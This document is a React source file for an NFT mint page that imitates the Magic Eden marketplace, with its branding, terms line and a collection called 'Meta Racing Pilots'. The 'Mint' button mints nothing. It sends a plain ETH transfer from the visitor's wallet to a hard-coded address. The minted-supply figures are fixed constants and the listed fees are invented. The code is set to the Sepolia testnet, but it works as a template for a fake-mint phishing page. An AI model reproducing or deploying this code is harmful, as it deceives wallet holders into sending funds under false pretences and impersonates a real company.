import { useEffect, useMemo, useState } from "react";
import { BrowserProvider, formatEther, parseEther } from "ethers";

const RECEIVER = "0x8A3F0f3De937Cf08D6A4144e945A354954F878E9";
const PRICE_PER_ITEM_ETH = "0.1";

const SEPOLIA_CHAIN_ID_DEC = 11155111n;
const SEPOLIA_CHAIN_ID_HEX = "0xAA36A7";

// minted UI (визуально)
const TOTAL_MINTED_PERCENT = 15.9;
const TOTAL_MINTED = 239;
const TOTAL_SUPPLY = 1500;

const IMAGES = [
  "/images/nft1.avif",
  "/images/nft2.avif",
  "/images/nft3.avif",
  "/images/nft4.avif",
];

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

:root{
  /* ===== YOUR EXACT COLORS ===== */
  --dg: #252131;            /* page bg */
  --hdr: #15111d;           /* header */
  --info: #1e1929;          /* info block (panel) */
  --btnHdr: #2d293a;        /* Buybacks/Rewards + inputs + qty bg */
  --btnSocial: #332e41;     /* Contract + icons (x/website/ds) */

  /* brand + text */
  --brand: 236 19 109;
  --brand-darker: 201 8 89;

  --textColor-primary: 242 242 243;
  --textColor-secondary: 133 127 148;

  --textColor-positive: 42 223 114;
  --textColor-attention: 236 182 19;
  --textColor-negative: 234 65 65;

  /* semantic */
  --text: rgb(var(--textColor-primary));
  --muted2: rgb(var(--textColor-secondary) / 0.78);
  --pink: rgb(var(--brand));
  --pink2: rgb(var(--brand) / 0.92);

  --shadow: 0 18px 60px rgb(0 0 0 / .55);
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
  --sans: Inter, sans-serif;

  /* apply your palette */
  --background: var(--dg);
  --layer-01: var(--info);

  --hdr-bg: var(--hdr);
  --hdr-border: rgba(255,255,255,.07);

  --hdr-btn-bg: var(--btnHdr);
  --hdr-search-bg: var(--btnHdr);
  --hdr-search-border: rgba(255,255,255,.08);
  --hdr-search-border-hover: rgba(255,255,255,.12);
  --hdr-text: rgb(var(--textColor-primary));

  /* spacing */
  --nav-pad-x: 18px;
  --nav-pad-x-m: 12px;
  --content-top-gap: 72px;

  /* corners */
  --btn-radius: 4px;
  --btn-radius-sm: 4px;
  --social-radius: 6px;
  --social-size: 44px;

  /* text sizing */
  --meta-text: 14px;
  --meta-text-strong: 14px;

  /* ✅ media rounding */
  --media-radius: 14px;       /* main image rounding */
  --thumb-radius: 12px;       /* thumbs rounding */

  /* ✅ spacing rule: thumbs gap == thumbs-to-main gap */
  --media-gap: 12px;

  /* ✅ thumbs must be exactly 131x131 */
  --thumb-size: 131px;
}

*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  font-family:var(--sans);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  color:var(--text);

  background:
    radial-gradient(1100px 650px at 50% -10%, rgb(var(--brand) / .10), transparent 60%),
    radial-gradient(900px 550px at 80% 10%, rgb(120 90 255 / .10), transparent 60%),
    linear-gradient(180deg, var(--background), var(--background));
}

#root{ width:100%; max-width:none; margin:0; padding:0; }

a{color:inherit}
button{font-family:inherit}
.page{min-height:100vh; width:100%;}

button, input { outline: none; }
button:focus, button:focus-visible { outline: none; box-shadow: none; }
input:focus, input:focus-visible { outline: none; box-shadow: none; }

/* ===== Header ===== */
.nav{
  position: sticky;
  top: 0;
  z-index: 50;
  width: 100%;
  background: var(--hdr-bg);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid var(--hdr-border);
}

.navInner{
  width: 100%;
  padding: 16px var(--nav-pad-x);
  display: flex;
  align-items: center;
  column-gap: 18px;
}

.navInner > .brand,
.navInner > .navLinks,
.navInner > .search,
.navInner > .navRight{ min-width: 0; }

.brand{
  display:flex;
  align-items:center;
  gap: 10px;
  min-width: max-content;
}
.brandMark{
  width: 28px;
  height: 28px;
  border-radius: 8px;
  background: linear-gradient(135deg, rgb(var(--brand)), rgb(139 92 255));
  box-shadow: 0 0 18px rgb(var(--brand) / .20);
}
.brandName{
  font-weight: 600;
  letter-spacing: .2px;
  color: var(--hdr-text);
  font-size: 14px;
}

.navLinks{
  display:flex;
  align-items:center;
  gap:18px;
  font-weight: 500;
  color: rgb(var(--textColor-primary) / .80);
}
.navLinks span{cursor: default}

.search{
  flex: 1;
  display:flex;
  align-items:center;
  gap: 10px;
  height: 40px;
  padding: 0 14px;
  border-radius: var(--btn-radius);
  background: var(--hdr-search-bg);
  border: 1px solid var(--hdr-search-border);
  color: rgb(var(--textColor-secondary) / 1);
  min-width: 260px;
}
.search:hover{ border-color: var(--hdr-search-border-hover); }
.search:focus-within{ border-color: var(--hdr-search-border-hover); }
.search input{
  flex: 1;
  background: transparent;
  border: none;
  color: var(--hdr-text);
  font-size: 13px;
  font-weight: 400;
}
.kHint{
  font-size: 12px;
  color: rgb(var(--textColor-secondary) / .85);
  border: 1px solid var(--hdr-search-border);
  padding: 3px 8px;
  border-radius: 6px;
}

.navRight{
  display:flex;
  align-items:center;
  gap: 8px;
  min-width: max-content;
}

.btn{
  height: 40px;
  padding: 0 14px;
  border-radius: var(--btn-radius);
  border: none;
  background: var(--hdr-btn-bg);
  color: var(--hdr-text);
  font-weight: 500;
  font-size: 14px;
  cursor: pointer;
  box-shadow: none;
  transition: filter .12s ease;
}
.btn:hover{ filter: brightness(.92); }
.btn:active{ filter: brightness(.92); }
.btn:disabled{ opacity: .5; cursor:not-allowed; filter:none; }

.btnPink{
  height: 40px;
  padding: 0 16px;
  border-radius: var(--btn-radius);
  border: none;
  background: linear-gradient(180deg, rgb(var(--brand) / .92), rgb(var(--brand)));
  color: rgb(var(--textColor-primary));
  font-weight: 600;
  cursor:pointer;
  box-shadow: none;
  transition: filter .12s ease;
}
.btnPink:hover{ filter: brightness(.92); }
.btnPink:active{ filter: brightness(.92); }

.iconBtn{
  height: 40px;
  width: 40px;
  border-radius: var(--btn-radius);
  border: none;
  background: var(--hdr-btn-bg);
  color: var(--hdr-text);
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  box-shadow: none;
  transition: filter .12s ease;
}
.iconBtn:hover{ filter: brightness(.92); }
.iconBtn:active{ filter: brightness(.92); }

.mobileOnly{ display:none; }

.mobileMenu{
  width: 100%;
  padding: 8px var(--nav-pad-x) 16px;
  border-bottom: 1px solid var(--hdr-border);
}
.mobileMenuItem{
  width:100%;
  height: 42px;
  border-radius: var(--btn-radius);
  border: none;
  background: var(--hdr-btn-bg);
  color: var(--hdr-text);
  text-align:left;
  padding: 0 12px;
  margin-top: 8px;
  font-weight: 500;
  transition: filter .12s ease;
}
.mobileMenuItem:hover{ filter: brightness(.92); }
.mobileMenuDivider{
  margin-top: 10px;
  border-top: 1px solid var(--hdr-border);
}

/* ===== Layout ===== */
.shell{
  max-width: 1240px;
  margin: 0 auto;
  padding: var(--content-top-gap) 18px 44px;
}

.topRow{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 12px;
}
.topLeft{
  display:flex;
  align-items:center;
  gap: 12px;
  min-width: 0;
}
.chainBadge{
  font-weight: 600;
  font-size: 12px;
  color: rgb(121 192 255);
  opacity: .85;
  letter-spacing: .6px;
}
.title{
  font-size: 34px;
  font-weight: 700;
  letter-spacing: .2px;
  line-height: 1.1;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.pillBtn{
  height: var(--social-size);
  padding: 0 16px;
  border-radius: var(--social-radius);
  border: none;
  background: var(--btnSocial);
  color: rgb(var(--textColor-primary) / .90);
  font-weight: 500;
  cursor:pointer;
  transition: filter .12s ease;
}
.pillBtn:hover{ filter: brightness(.92); }
.pillBtn:active{ filter: brightness(.92); }

.infoLinks{
  display:flex;
  align-items:center;
  gap: 12px;
}

.pillIcon{
  width: var(--social-size);
  height: var(--social-size);
  border-radius: var(--social-radius);
  border: none;
  background: var(--btnSocial);
  color: rgb(var(--textColor-primary) / .95);
  display:inline-flex;
  align-items:center;
  justify-content:center;
  font-weight: 800;
  font-size: 15px;
  line-height: 1;
  padding: 0;
  cursor:pointer;
  transition: filter .12s ease;
}
.pillIcon:hover{ filter: brightness(.92); }
.pillIcon:active{ filter: brightness(.92); }
.pillIcon span{ transform: translateY(-0.5px); }

/* grid */
.mainGrid{
  display:grid;
  grid-template-columns: 1.1fr .9fr;
  gap: 22px;
  align-items:start;
}

/* ===== MEDIA ===== */
.mediaCard{
  background: transparent;
  border: none;
  box-shadow: none;
  border-radius: 0;
  overflow: visible;
}

/* ✅ wrapper locks thumbs within big-image width */
.mediaWrap{
  width: 580px;
  max-width: 100%;
  margin: 0 auto;
}

.mediaMain{
  position: relative;
  width: 100%;
  height: 580px;
  display:flex;
  align-items:center;
  justify-content:center;
  background: transparent;
}

.mainImg{
  width: 100%;
  height: 580px;
  object-fit: contain;
  object-position: center;
  background: transparent;
  border: none;
  border-radius: var(--media-radius);
  box-shadow: none;
  image-rendering: auto;
}

.fullscreen{
  position:absolute;
  right: 14px;
  top: 14px;
  width: 38px;
  height: 38px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: var(--btn-radius);
  border: 1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  color: rgba(236,234,247,.9);
}

/* ✅ thumbs:
   - size fixed 131x131
   - gap == margin-top
   - image fills the 131x131 fully (cover)
*/
.thumbRow{
  width: 100%;
  display:grid;
  grid-template-columns: repeat(4, var(--thumb-size));
  justify-content: space-between;       /* ✅ растягиваем по ширине без выхода */
  gap: var(--media-gap);
  margin-top: var(--media-gap);
  padding: 0;
  background: transparent;
  border-top: none;
  overflow: hidden;                    /* ✅ на всякий */
}

.thumbBtn{
  width: var(--thumb-size);
  height: var(--thumb-size);
  border-radius: var(--thumb-radius);
  border: none;
  background: transparent;
  padding: 0;
  overflow: hidden;                    /* ✅ скругление */
  cursor: pointer;
  opacity: .85;
  transition: filter .12s ease, opacity .12s ease;
}
.thumbBtn:hover{ filter: brightness(.92); }
.thumbBtn:active{ filter: brightness(.92); }
.thumbBtn.active{
  outline: 2px solid rgba(236,19,109,.75);
  outline-offset: 0;
  opacity: 1;
}

.thumbImg{
  width: 100%;
  height: 100%;
  display:block;
  border-radius: var(--thumb-radius);
  object-fit: cover;                   /* ✅ заполняет 131x131 полностью */
  object-position: center;
}

/* panel */
.panel{
  background: var(--info);
  border: 1px solid rgba(255,255,255,.08);
  border-radius: 16px;
  box-shadow: var(--shadow);
  overflow:hidden;
}
.panelInner{ padding: 18px; }

.metaRow{
  display:flex;
  align-items:flex-start;
  justify-content:space-between;
  gap: 12px;
  margin-bottom: 12px;
}
.metaLeft{
  display:flex;
  flex-direction:column;
  gap: 10px;
}
.metaLine{
  display:flex;
  align-items:center;
  gap: 12px;
  flex-wrap: nowrap;
}

.eligPill{
  display:inline-flex;
  align-items:center;
  gap: 8px;
  height: 30px;
  padding: 0 10px;
  border-radius: 8px;
  border: 1px solid rgba(255,255,255,.14);
  background: transparent;
  color: rgba(242,242,243,.92);
  font-weight: 600;
  font-size: var(--meta-text);
  white-space: nowrap;
}
.lockIcon{ font-size: 13px; opacity: .9; }

.publicRow{
  display:flex;
  align-items:center;
  gap: 8px;
  color: rgba(242,242,243,.72);
  font-size: var(--meta-text);
  font-weight: 600;
  white-space: nowrap;
}
.greenDot{
  width: 8px;
  height: 8px;
  border-radius: 999px;
  background: rgb(var(--textColor-positive));
  box-shadow: 0 0 10px rgb(var(--textColor-positive) / .18);
}

/* minted */
.mintedBox{
  min-width: 240px;
  display:flex;
  flex-direction:column;
  align-items:stretch;
  gap: 8px;
}
.mintedHeader{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 10px;
}
.mintedTop{
  font-size: 12px;
  color: rgba(133,127,148,.90);
  font-weight: 400;
}
.mintedNums{
  font-size: 12px;
  color: rgba(242,242,243,.86);
  font-weight: 600;
  white-space: nowrap;
}
.mintedBar{
  width: 100%;
  height: 6px;
  border-radius: 999px;
  background: rgba(255,255,255,.10);
  overflow:hidden;
}
.mintedFill{
  height: 100%;
  width: var(--pct, 0%);
  background: rgb(var(--brand));
  border-radius: 999px;
}

/* Price + qty on ONE LINE */
.rowTop{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 14px;
  margin-top: 10px;
}
.priceBlock .label{
  font-size: var(--meta-text-strong);
  color: rgba(242,242,243,.76);
  font-weight: 700;
}
.priceBlock .priceLine{
  display:flex;
  align-items:baseline;
  gap: 10px;
  margin-top: 6px;
}
.priceBig{ font-size: 28px; font-weight: 700; }
.usd{ font-size: 13px; color: rgba(133,127,148,.90); font-weight: 500; }

/* qty */
.stepper{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap: 0;
  height: 40px;
  padding: 0 6px;
  border-radius: var(--btn-radius);
  background: var(--hdr-btn-bg);
  border: none;
  min-width: 150px;
}
.stepBtn{
  width: 40px;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius: var(--btn-radius);
  border: none;
  background: transparent;
  color: var(--text);
  font-size: 18px;
  line-height: 1;
  padding: 0;
  cursor:pointer;
  transition: filter .12s ease;
}
.stepBtn:hover{ filter: brightness(.92); }
.stepBtn:active{ filter: brightness(.92); }
.stepBtn:disabled{opacity:.35; cursor:not-allowed; filter:none}

.stepVal{
  flex: 1;
  height: 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
  font-weight: 600;
  line-height: 1;
}

.fees{
  margin-top: 12px;
  display:grid;
  grid-template-columns: 1fr auto;
  gap: 8px 12px;
  color: rgba(242,242,243,.72);
  font-size: 12px;
}
.fees .r{ text-align:right; font-weight: 600; color: rgba(242,242,243,.82); }
.smallLink{ color: rgba(133,127,148,.90); text-decoration: underline; cursor: default; }

.terms{
  margin-top: 14px;
  display:flex;
  gap: 10px;
  align-items:flex-start;
  color: rgba(133,127,148,.90);
  font-size: 12px;
  line-height: 1.35;
}

.cb{
  appearance: none;
  -webkit-appearance: none;
  width: 18px;
  height: 18px;
  border-radius: var(--btn-radius);
  border: none;
  background: var(--hdr-btn-bg);
  display:inline-grid;
  place-items:center;
  margin-top: 2px;
  cursor: pointer;
  transition: filter .12s ease;
}
.cb:hover{ filter: brightness(.92); }
.cb:active{ filter: brightness(.92); }
.cb:checked::after{
  content: "✓";
  font-size: 14px;
  font-weight: 800;
  color: rgba(242,242,243,.92);
  transform: translateY(-0.5px);
}

.primaryCta{
  margin-top: 14px;
  width: 100%;
  padding: 13px 14px;
  border-radius: var(--btn-radius);
  border: none;
  background: linear-gradient(180deg, rgb(var(--brand) / .92), rgb(var(--brand)));
  color: rgba(242,242,243,1);
  font-weight: 600;
  cursor:pointer;
  transition: filter .12s ease;
}
.primaryCta:hover{ filter: brightness(.92); }
.primaryCta:active{ filter: brightness(.92); }
.primaryCta:disabled{opacity:.55; cursor:not-allowed; filter:none}
.primaryCta.notBold{ font-weight: 400; }

.noticeLock{
  margin-top: 12px;
  padding: 12px 12px;
  border-radius: var(--btn-radius);
  background: rgba(0,0,0,.18);
  border: 1px solid rgba(255,255,255,.08);
  color: rgba(242,242,243,.72);
  font-size: 12px;
  display:flex;
  gap:10px;
  align-items:center;
}

.txBox{
  margin-top: 12px;
  padding: 12px;
  border-radius: var(--btn-radius);
  border: 1px solid rgba(255,255,255,.10);
  background: rgba(255,255,255,.04);
  font-size: 12px;
  color: rgba(242,242,243,.72);
}
.txBox a{
  display:inline-block;
  margin-top: 8px;
  color: rgba(154, 215, 255, .95);
  font-weight: 600;
  text-decoration: none;
}

.err{
  margin-top: 12px;
  padding: 12px;
  border-radius: var(--btn-radius);
  border: 1px solid rgba(234, 65, 65, .35);
  background: rgba(234, 65, 65, .12);
  color: rgba(255, 220, 220, .95);
  font-size: 12px;
}

/* Responsive */
@media (max-width: 1050px){
  .mainGrid{ grid-template-columns: 1fr; }
  .mediaWrap{ width: 520px; }

  .mediaMain{ height: 520px; }
  .mainImg{ height: 520px; }

  :root{ --thumb-size: 118px; }
}

@media (max-width: 860px){
  .navLinks{ display:none; }
  .kHint{ display:none; }
  .search{ display:none; }
  .mobileOnly{ display:flex; }

  .navInner{ padding-left: var(--nav-pad-x-m); padding-right: var(--nav-pad-x-m); }
  .mobileMenu{ padding-left: var(--nav-pad-x-m); padding-right: var(--nav-pad-x-m); }

  :root{ --content-top-gap: 56px; --thumb-size: 96px; }

  .mediaWrap{ width: 420px; }
  .mediaMain{ height: 420px; }
  .mainImg{ height: 420px; }
}

@media (max-width: 640px){
  :root{ --thumb-size: 72px; }
  .mediaWrap{ width: 320px; }
  .mediaMain{ height: 340px; }
  .mainImg{ height: 320px; }

  .title{ font-size: 24px; }
  .mintedBox{ min-width: 200px; }
}
`;

function shortAddr(a) {
  if (!a) return "";
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

export default function App() {
  const [account, setAccount] = useState(null);
  const [qty, setQty] = useState(1);
  const [txHash, setTxHash] = useState(null);
  const [error, setError] = useState(null);
  const [status, setStatus] = useState("idle"); // idle | sending | success
  const [chainId, setChainId] = useState(null);
  const [accepted, setAccepted] = useState(false);
  const [activeThumb, setActiveThumb] = useState(0);
  const [menuOpen, setMenuOpen] = useState(false);

  const itemWei = useMemo(() => parseEther(PRICE_PER_ITEM_ETH), []);
  const totalWei = useMemo(() => itemWei * BigInt(qty), [itemWei, qty]);

  const eligible = !!account;

  const refreshNetwork = async () => {
    try {
      if (!window.ethereum) return;
      const provider = new BrowserProvider(window.ethereum);
      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch {}
  };

  useEffect(() => {
    const init = async () => {
      if (!window.ethereum) return;
      try {
        const provider = new BrowserProvider(window.ethereum);
        const net = await provider.getNetwork();
        setChainId(net.chainId);

        const accs = await provider.send("eth_accounts", []);
        if (accs?.[0]) setAccount(accs[0]);
      } catch {}
    };
    init();
  }, []);

  useEffect(() => {
    if (!window.ethereum) return;

    const onChainChanged = () => refreshNetwork();
    const onAccountsChanged = (accs) => setAccount(accs?.[0] ?? null);

    window.ethereum.on?.("chainChanged", onChainChanged);
    window.ethereum.on?.("accountsChanged", onAccountsChanged);

    return () => {
      window.ethereum.removeListener?.("chainChanged", onChainChanged);
      window.ethereum.removeListener?.("accountsChanged", onAccountsChanged);
    };
  }, []);

  const connect = async () => {
    try {
      setError(null);
      setTxHash(null);

      if (!window.ethereum) {
        throw new Error(
          "Wallet не найден. Открой в браузере с MetaMask (не во встроенном preview) и установи расширение."
        );
      }

      const provider = new BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      setAccount(await signer.getAddress());

      const net = await provider.getNetwork();
      setChainId(net.chainId);
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const switchToSepolia = async () => {
    try {
      setError(null);
      if (!window.ethereum) throw new Error("Wallet не найден.");

      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: SEPOLIA_CHAIN_ID_HEX }],
        });
      } catch (switchError) {
        if (switchError?.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: SEPOLIA_CHAIN_ID_HEX,
                chainName: "Sepolia",
                nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
                rpcUrls: ["https://ethereum-sepolia-rpc.publicnode.com"],
                blockExplorerUrls: ["https://sepolia.etherscan.io"],
              },
            ],
          });
        } else {
          throw switchError;
        }
      }
      await refreshNetwork();
    } catch (e) {
      setError(e?.message ?? String(e));
    }
  };

  const buy = async () => {
    try {
      setError(null);
      setTxHash(null);
      setStatus("idle");

      if (!window.ethereum) throw new Error("Wallet не найден.");
      if (!account) throw new Error("Сначала нажми Log In.");
      if (!accepted) throw new Error("Нужно принять Terms (checkbox).");

      const provider = new BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      setChainId(network.chainId);

      if (network.chainId !== SEPOLIA_CHAIN_ID_DEC) {
        throw new Error("Неверная сеть. Переключись на Sepolia (тест).");
      }

      const signer = await provider.getSigner();

      setStatus("sending");
      const tx = await signer.sendTransaction({
        to: RECEIVER,
        value: totalWei,
        gasLimit: 21000n,
      });

      setTxHash(tx.hash);
      await tx.wait();
      setStatus("success");
    } catch (e) {
      setStatus("idle");
      setError(e?.shortMessage ?? e?.message ?? String(e));
    }
  };

  const isSepolia = chainId === SEPOLIA_CHAIN_ID_DEC;

  const mintFeeEth = useMemo(() => (0.003 * (Number(qty) || 0)).toFixed(3), [qty]);
  const protocolFeeEth = useMemo(() => (0.0014 * (Number(qty) || 0)).toFixed(4), [qty]);

  const canMint = !!account && isSepolia && accepted && status !== "sending";

  return (
    <div className="page">
      <style>{CSS}</style>

      {/* HEADER */}
      <div className="nav">
        <div className="navInner">
          <div className="brand">
            <div className="brandMark" />
            <span className="brandName">MAGIC EDEN</span>
          </div>

          <div className="navLinks">
            <span>Play</span>
            <span>Trade</span>
            <span>Mint</span>
          </div>

          <div className="search">
            <span style={{ opacity: 0.8 }}>🔎</span>
            <input placeholder="Search collections on Magic Eden" />
            <span className="kHint">Ctrl K</span>
          </div>

          <div className="navRight">
            <button className="btn">Buybacks</button>
            <button className="btn">Rewards</button>

            <button
              className="iconBtn mobileOnly"
              onClick={() => setMenuOpen((v) => !v)}
              aria-label="menu"
              title="Menu"
            >
              ☰
            </button>

            <button className="btnPink" onClick={connect}>
              {account ? shortAddr(account) : "Log In"}
            </button>
          </div>
        </div>

        {menuOpen && (
          <div className="mobileMenu">
            <button className="mobileMenuItem">Play</button>
            <button className="mobileMenuItem">Trade</button>
            <button className="mobileMenuItem">Mint</button>
            <div className="mobileMenuDivider" />
            <button className="mobileMenuItem">Buybacks</button>
            <button className="mobileMenuItem">Rewards</button>
          </div>
        )}
      </div>

      <div className="shell">
        <div className="mainGrid" style={{ alignItems: "start" }}>
          {/* LEFT TOP: title */}
          <div className="topRow" style={{ margin: 0, justifyContent: "flex-start" }}>
            <div className="topLeft">
              <div className="chainBadge">ETH</div>
              <div className="title">Meta Racing Pilots</div>
            </div>
          </div>

          {/* RIGHT TOP: Contract + icons */}
          <div className="topRow" style={{ margin: 0 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <button className="pillBtn">Contract</button>
            </div>
            <div className="infoLinks">
              <button className="pillIcon" title="Website">
                <span>🌐</span>
              </button>
              <button className="pillIcon" title="X">
                <span>X</span>
              </button>
              <button className="pillIcon" title="Discord">
                <span>DS</span>
              </button>
            </div>
          </div>

          {/* LEFT: media */}
          <div className="mediaCard" style={{ marginTop: 6 }}>
            <div className="mediaWrap">
              <div className="mediaMain">
                <img src={IMAGES[activeThumb]} alt="Preview" className="mainImg" />
                <div className="fullscreen" title="Fullscreen">
                  ⤢
                </div>
              </div>

              <div className="thumbRow">
                {IMAGES.map((src, i) => (
                  <button
                    key={src}
                    type="button"
                    className={`thumbBtn ${activeThumb === i ? "active" : ""}`}
                    onClick={() => setActiveThumb(i)}
                    title="Preview"
                  >
                    <img src={src} alt={`Thumb ${i + 1}`} className="thumbImg" />
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* RIGHT: panel */}
          <div className="rightCol" style={{ marginTop: 6 }}>
            <div className="panel">
              <div className="panelInner">
                <div className="metaRow">
                  <div className="metaLeft">
                    <div className="metaLine">
                      <div className="eligPill">
                        {!eligible && <span className="lockIcon">🔒</span>}
                        {eligible ? "Eligible" : "Not Eligible"}
                      </div>

                      <div className="publicRow">
                        <span className="greenDot" />
                        <span>Public</span>
                      </div>
                    </div>
                  </div>

                  <div className="mintedBox">
                    <div className="mintedHeader">
                      <div className="mintedTop">Total minted</div>
                      <div className="mintedNums">
                        {TOTAL_MINTED_PERCENT}%&nbsp;&nbsp; {TOTAL_MINTED} / {TOTAL_SUPPLY}
                      </div>
                    </div>

                    <div
                      className="mintedBar"
                      aria-label="minted progress"
                      style={{ ["--pct"]: `${TOTAL_MINTED_PERCENT}%` }}
                    >
                      <div className="mintedFill" />
                    </div>
                  </div>
                </div>

                <div className="rowTop">
                  <div className="priceBlock">
                    <div className="label">Price</div>
                    <div className="priceLine">
                      <div className="priceBig">{PRICE_PER_ITEM_ETH} ETH</div>
                      <div className="usd">(test)</div>
                    </div>
                  </div>

                  <div className="stepper">
                    <button
                      className="stepBtn"
                      onClick={() => setQty((v) => Math.max(1, Number(v) - 1))}
                      disabled={qty <= 1}
                      aria-label="decrease"
                    >
                      −
                    </button>
                    <div className="stepVal">{qty}</div>
                    <button
                      className="stepBtn"
                      onClick={() => setQty((v) => Math.min(20, Number(v) + 1))}
                      disabled={qty >= 20}
                      aria-label="increase"
                    >
                      +
                    </button>
                  </div>
                </div>

                <div className="fees">
                  <div>Mint fee</div>
                  <div className="r">{mintFeeEth} ETH</div>

                  <div>Protocol fee</div>
                  <div className="r">{protocolFeeEth} ETH</div>

                  <div>
                    Priority fee <span className="smallLink">(Standard)</span>
                  </div>
                  <div className="r">—</div>

                  <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>
                    Subtotal
                  </div>
                  <div style={{ marginTop: 6 }} className="r">
                    {formatEther(totalWei)} ETH
                  </div>
                </div>

                <div className="terms">
                  <input
                    className="cb"
                    type="checkbox"
                    checked={accepted}
                    onChange={(e) => setAccepted(e.target.checked)}
                  />
                  <div>
                    By clicking "mint", you agree to the Magic Eden Terms of Service.
                    <div style={{ marginTop: 6, color: "rgb(var(--textColor-secondary) / .85)" }}>
                      Network:{" "}
                      {isSepolia ? (
                        <b style={{ color: "rgb(var(--textColor-primary) / .88)" }}>Sepolia</b>
                      ) : (
                        <b style={{ color: "rgb(var(--textColor-attention))" }}>
                          Wrong / Not Sepolia
                        </b>
                      )}
                      {!isSepolia && (
                        <button
                          className="btn"
                          style={{ padding: "6px 10px", marginLeft: 8, height: 34 }}
                          onClick={switchToSepolia}
                        >
                          Switch to Sepolia
                        </button>
                      )}
                    </div>
                  </div>
                </div>

                <button
                  className={`primaryCta ${account ? "" : "notBold"}`}
                  onClick={account ? buy : connect}
                  disabled={account ? !canMint : status === "sending"}
                >
                  {account ? (status === "sending" ? "Confirming…" : "Mint") : "Log In to mint"}
                </button>

                <div className="noticeLock">
                  <span style={{ color: "rgb(var(--brand) / .90)" }}>🔒</span>
                  <span>Collection is locked from trading until all items have been minted.</span>
                </div>

                {txHash && (
                  <div className="txBox">
                    <div>
                      Tx: <span style={{ fontFamily: "var(--mono)" }}>{shortAddr(txHash)}</span>
                    </div>
                    <a
                      href={`https://sepolia.etherscan.io/tx/${txHash}`}
                      target="_blank"
                      rel="noreferrer"
                    >
                      View on Etherscan →
                    </a>
                  </div>
                )}

                {error && <div className="err">{error}</div>}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
